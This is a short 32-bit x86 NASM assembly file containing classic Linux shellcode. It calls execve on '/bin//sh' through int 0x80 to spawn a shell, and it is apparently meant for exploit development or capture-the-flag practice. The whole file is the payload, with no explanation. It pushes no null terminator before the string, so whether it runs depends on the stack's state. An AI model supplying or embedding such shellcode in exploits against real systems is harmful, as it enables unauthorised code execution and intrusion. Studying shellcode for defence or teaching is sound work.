bits 32
global _start

_start:
	xor eax, eax
	mov  al, 0x0b
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
        int 0x80
